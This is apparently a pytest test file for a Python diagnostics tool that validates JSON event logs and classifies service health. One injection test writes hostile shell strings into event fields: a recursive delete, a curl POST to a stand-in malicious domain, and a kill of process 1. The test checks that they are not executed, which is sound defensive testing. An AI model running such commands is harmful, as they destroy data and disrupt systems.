"""Tests for JSON diagnostic event ingestion, validation, and classification."""

import json
from pathlib import Path

import pytest

from cli_diagnostics.events import (
    EventValidationError,
    analyze_events,
    classify_service_health,
    load_events_from_file,
    process_events_file,
    validate_events_payload,
    validate_single_event,
)
from cli_diagnostics.models import DiagnosticStatus, EventSeverity


def test_process_sample_diagnostic_events_file():
    """Verify exact validation metrics for samples/diagnostic-events.json."""
    sample_path = Path("samples/diagnostic-events.json")
    assert sample_path.exists(), "Sample diagnostic file must exist"

    result = process_events_file(sample_path)

    assert result.generated_for == "RabTech Python Software Engineering Internship"
    assert result.total_events == 5
    assert result.info_count == 2
    assert result.warn_count == 1
    assert result.error_count == 2
    assert result.http_5xx_count == 2
    assert result.missing_latency_count == 1

    # Verify per-service breakdown
    assert "billing-api" in result.services
    assert "profile-api" in result.services
    assert len(result.services) == 2

    billing = result.services["billing-api"]
    assert billing.total_events == 4
    assert billing.info_count == 1
    assert billing.warn_count == 1
    assert billing.error_count == 2
    assert billing.http_5xx_count == 2
    assert billing.missing_latency_count == 1
    assert billing.health == DiagnosticStatus.UNHEALTHY

    profile = result.services["profile-api"]
    assert profile.total_events == 1
    assert profile.info_count == 1
    assert profile.warn_count == 0
    assert profile.error_count == 0
    assert profile.http_5xx_count == 0
    assert profile.missing_latency_count == 0
    assert profile.avg_latency_ms == pytest.approx(205.0)
    assert profile.health == DiagnosticStatus.HEALTHY

    # Overall analysis status
    assert result.overall_status == "attention required"
    assert result.is_healthy is False


def test_load_events_file_not_found(tmp_path):
    """Verify FileNotFoundError on missing file."""
    with pytest.raises(FileNotFoundError):
        load_events_from_file(tmp_path / "nonexistent.json")


def test_load_events_invalid_json(tmp_path):
    """Verify EventValidationError on malformed JSON content."""
    bad_json_file = tmp_path / "malformed.json"
    bad_json_file.write_text("{ this is not valid json : 123", encoding="utf-8")
    with pytest.raises(EventValidationError) as exc:
        load_events_from_file(bad_json_file)
    assert "Invalid JSON syntax" in str(exc.value)


def test_validate_events_missing_events_key():
    """Verify EventValidationError when root object has no 'events' key."""
    with pytest.raises(EventValidationError) as exc:
        validate_events_payload({"generated_for": "Test"})
    assert "must contain an 'events' list" in str(exc.value)


def test_validate_single_event_invalid_severity():
    """Verify rejection of unknown event severities."""
    invalid_raw = {
        "timestamp": "2026-08-01T09:00:00Z",
        "service": "auth-service",
        "severity": "CRITICAL",  # Not INFO, WARN, or ERROR
        "latency_ms": 100,
        "http_status": 200,
    }
    with pytest.raises(EventValidationError) as exc:
        validate_single_event(invalid_raw, index=0)
    assert "invalid severity" in str(exc.value)


def test_validate_single_event_invalid_http_status():
    """Verify rejection of out-of-range HTTP status code."""
    raw = {
        "timestamp": "2026-08-01T09:00:00Z",
        "service": "api",
        "severity": "INFO",
        "latency_ms": 50,
        "http_status": 999,
    }
    with pytest.raises(EventValidationError) as exc:
        validate_single_event(raw, index=1)
    assert "invalid HTTP status code" in str(exc.value)


def test_validate_single_event_negative_latency():
    """Verify rejection of negative latency."""
    raw = {
        "timestamp": "2026-08-01T09:00:00Z",
        "service": "api",
        "severity": "INFO",
        "latency_ms": -10,
        "http_status": 200,
    }
    with pytest.raises(EventValidationError) as exc:
        validate_single_event(raw, index=2)
    assert "negative latency_ms" in str(exc.value)


def test_security_against_command_injection(tmp_path):
    """Verify that dangerous command strings in JSON are never executed."""
    malicious_payload = {
        "generated_for": "Security Audit",
        "events": [
            {
                "timestamp": "2026-08-01T09:00:00Z",
                "service": "auth-api",
                "severity": "INFO",
                "latency_ms": 50,
                "http_status": 200,
                "command": "rm -rf /tmp/test-exploit",
                "cmd": "curl -X POST http://malicious.domain",
                "exec": "kill -9 1",
            }
        ],
    }
    audit_file = tmp_path / "audit.json"
    audit_file.write_text(json.dumps(malicious_payload), encoding="utf-8")

    result = process_events_file(audit_file)
    assert result.total_events == 1
    assert result.is_healthy is True
    # The event should validate normally without executing any commands


def test_all_healthy_service_events():
    """Verify classification when all events are healthy."""
    payload = {
        "generated_for": "Nominal Health Run",
        "events": [
            {
                "timestamp": "2026-08-01T10:00:00Z",
                "service": "user-api",
                "severity": "INFO",
                "latency_ms": 110,
                "http_status": 200,
            },
            {
                "timestamp": "2026-08-01T10:01:00Z",
                "service": "user-api",
                "severity": "INFO",
                "latency_ms": 125,
                "http_status": 200,
            },
        ],
    }
    _, events = validate_events_payload(payload)
    result = analyze_events("Nominal Health Run", events)

    assert result.total_events == 2
    assert result.error_count == 0
    assert result.warn_count == 0
    assert result.overall_status == "healthy"
    assert result.is_healthy is True
    assert result.services["user-api"].health == DiagnosticStatus.HEALTHY
